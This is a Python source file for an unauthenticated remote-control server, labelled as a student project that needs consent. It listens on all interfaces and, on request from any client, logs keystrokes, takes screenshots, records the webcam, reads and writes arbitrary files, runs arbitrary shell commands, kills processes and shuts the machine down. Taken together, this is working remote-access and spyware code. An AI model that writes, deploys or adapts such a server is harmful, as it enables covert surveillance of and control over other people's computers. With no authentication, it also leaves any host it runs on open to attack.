"""
Simple Python remote control server (no auth) using length-prefixed JSON messages.
Features: process/app control, screenshot, keystroke logging (demo), file transfer,
shutdown/restart, webcam capture/record. Designed for student projects; requires consent.
"""

import base64
import json
import os
import socket
import struct
import subprocess
import threading
import time
import tempfile
import cv2
from typing import Any, Dict, Tuple

# Optional dependencies; handlers check availability.
try:
    import psutil  # type: ignore
except Exception:
    psutil = None

try:
    import mss  # type: ignore
except Exception:
    mss = None

try:
    import cv2  # type: ignore
except Exception:
    cv2 = None

try:
    from pynput import keyboard  # type: ignore
except Exception:
    keyboard = None

HOST = "0.0.0.0"
PORT = 12345
RECV_TIMEOUT = 60


def send_message(conn: socket.socket, payload: Dict[str, Any]) -> None:
    data = json.dumps(payload).encode("utf-8")
    header = struct.pack(">I", len(data))
    conn.sendall(header + data)


def recv_exact(conn: socket.socket, size: int) -> bytes:
    buf = b""
    while len(buf) < size:
        chunk = conn.recv(size - len(buf))
        if not chunk:
            raise ConnectionError("connection closed while receiving data")
        buf += chunk
    return buf


def recv_message(conn: socket.socket) -> Dict[str, Any]:
    header = recv_exact(conn, 4)
    (length,) = struct.unpack(">I", header)
    body = recv_exact(conn, length)
    return json.loads(body.decode("utf-8"))


keylog_lock = threading.Lock()
keylog_buffer = []
keylog_listener = None


def start_keylogger() -> str:
    global keylog_listener
    if keyboard is None:
        return "pynput not installed"
    if keylog_listener and keylog_listener.running:
        return "keylogger already running"

    def on_press(key):
        with keylog_lock:
            try:
                keylog_buffer.append(key.char or str(key))
            except AttributeError:
                keylog_buffer.append(str(key))

    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    return "keylogger started"


def stop_keylogger() -> str:
    global keylog_listener
    if not keylog_listener:
        return "keylogger not running"
    keylog_listener.stop()
    keylog_listener = None
    return "keylogger stopped"


def dump_keylog() -> str:
    with keylog_lock:
        data = "".join(keylog_buffer)
        keylog_buffer.clear()
    return data


def screenshot_png() -> Tuple[str, str]:
    if mss is None:
        return "error", "mss not installed"
    with mss.mss() as sct:
        shot = sct.shot(output=os.path.join(tempfile.gettempdir(), "screenshot.png"))
    with open(shot, "rb") as f:
        encoded = base64.b64encode(f.read()).decode("ascii")
    return "ok", encoded


def webcam_open() -> Tuple[str, str]:
    if cv2 is None:
        return "error", "opencv-python not installed"
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return "error", "cannot open webcam"
    cap.release()

    return "ok", "Mở camera thành công"

#Tách webcam start - stop
record_state = {
    "cap": None,
    "out": None,
    "thread": None,
    "running": False,
    "file_path": None,
}


def _record_worker():
    global record_state

    cap = record_state["cap"]
    out = record_state["out"]

    while record_state["running"]:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
        time.sleep(0.01)  # giảm ăn CPU một chút

    if cap is not None:
        cap.release()
    if out is not None:
        out.release()

    record_state["cap"] = None
    record_state["out"] = None
    record_state["thread"] = None
    record_state["running"] = False


def webcam_record_start() -> Tuple[str, str]:
    global record_state

    if cv2 is None:
        return "error", "opencv-python not installed"

    if record_state["running"]:
        return "error", "already recording"

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return "error", "cannot open webcam"

    fps = 20
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    tmp_path = os.path.join(os.getcwd(), "record.mp4")

    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    out = cv2.VideoWriter(tmp_path, fourcc, fps, (width, height))

    record_state["cap"] = cap
    record_state["out"] = out
    record_state["running"] = True
    record_state["file_path"] = tmp_path

    t = threading.Thread(target=_record_worker, daemon=True)
    record_state["thread"] = t
    t.start()

    return "ok", "start recording"


def webcam_record_stop() -> Tuple[str, str]:
    global record_state

    if not record_state["running"]:
        return "error", "not recording"

    record_state["running"] = False

    thread = record_state["thread"]
    if thread is not None:
        thread.join(timeout=2)

    file_path = record_state["file_path"] or ""
    if not file_path or not os.path.exists(file_path):
        return "error", "record file not found"

    with open(file_path, "rb") as f:
        encoded = base64.b64encode(f.read()).decode("ascii")

    return "ok", encoded


def list_processes():
    if psutil is None:
        return "psutil not installed"
    result = []
    for proc in psutil.process_iter(attrs=["pid", "name", "username"]):
        info = proc.info
        result.append(
            {
                "pid": info.get("pid"),
                "name": info.get("name"),
                "user": info.get("username"),
            }
        )
    return result


def kill_process(pid: int) -> str:
    if psutil is None:
        return "psutil not installed"
    try:
        p = psutil.Process(pid)
        p.terminate()
        p.wait(5)
        return "terminated"
    except psutil.NoSuchProcess:
        return "no such process"
    except psutil.TimeoutExpired:
        p.kill()
        return "killed"
    except Exception as exc:  # noqa: BLE001
        return f"error: {exc}"


def start_application(command: str) -> str:
    try:
        subprocess.Popen(command, shell=True)
        return "started"
    except Exception as exc:  # noqa: BLE001
        return f"error: {exc}"


def shutdown_system(restart: bool) -> str:
    flag = "/r" if restart else "/s"
    try:
        subprocess.Popen(["shutdown", flag, "/t", "5"])
        return "shutdown initiated" if not restart else "restart initiated"
    except Exception as exc:  # noqa: BLE001
        return f"error: {exc}"


def read_file_b64(path: str) -> Tuple[str, str]:
    try:
        with open(path, "rb") as f:
            data = base64.b64encode(f.read()).decode("ascii")
        return "ok", data
    except Exception as exc:  # noqa: BLE001
        return "error", str(exc)


def write_file_b64(path: str, data_b64: str) -> str:
    try:
        data = base64.b64decode(data_b64.encode("ascii"))
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return "written"
    except Exception as exc:  # noqa: BLE001
        return f"error: {exc}"


def handle_command(cmd: Dict[str, Any]) -> Dict[str, Any]:
    action = cmd.get("action")
    if action == "ping":
        return {"status": "ok", "data": "pong"}
    if action == "list_processes":
        return {"status": "ok", "data": list_processes()}
    if action == "kill_process":
        return {"status": "ok", "data": kill_process(int(cmd.get("pid", -1)))}
    if action == "start_app":
        return {"status": "ok", "data": start_application(cmd.get("command", ""))}
    if action == "screenshot":
        status, img = screenshot_png()
        return {"status": status, "data": img, "encoding": "base64_png"}
    if action == "keylog_start":
        return {"status": "ok", "data": start_keylogger()}
    if action == "keylog_stop":
        return {"status": "ok", "data": stop_keylogger()}
    if action == "keylog_dump":
        return {"status": "ok", "data": dump_keylog()}
    if action == "download":
        status, content = read_file_b64(cmd.get("path", ""))
        return {"status": status, "data": content, "encoding": "base64_file"}
    if action == "upload":
        return {"status": "ok", "data": write_file_b64(cmd.get("path", ""), cmd.get("data", ""))}
    if action == "shutdown":
        return {"status": "ok", "data": shutdown_system(False)}
    if action == "restart":
        return {"status": "ok", "data": shutdown_system(True)}
    if action == "webcam_open":
        status, img = webcam_open()
        return {"status": status, "data": img, "encoding": "base64_jpg"}
    if action == "webcam_record_start":
        status, msg = webcam_record_start()
        return {"status": status, "data": msg}
    if action == "webcam_record_stop":
        status, file_path = webcam_record_stop()
        return {"status": status, "data": file_path, "encoding": "base64_mp4"}
    return {"status": "error", "data": f"unknown action {action}"}


def handle_client(conn: socket.socket, addr):
    conn.settimeout(RECV_TIMEOUT)
    print(f"Client connected: {addr}")
    try:
        while True:
            try:
                cmd = recv_message(conn)
            except socket.timeout:
                print(f"{addr} timeout after {RECV_TIMEOUT}s")
                break
            except (ConnectionError, json.JSONDecodeError) as exc:
                print(f"{addr} disconnect/error: {exc}")
                break

            response = handle_command(cmd)
            send_message(conn, response)
    finally:
        conn.close()
        print(f"Client {addr} closed")


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen()
    print(f"Server listening on {HOST}:{PORT}")

    try:
        while True:
            conn, addr = server.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            t.start()
    except KeyboardInterrupt:
        print("Shutting down server")
    finally:
        server.close()


if __name__ == "__main__":
    main()
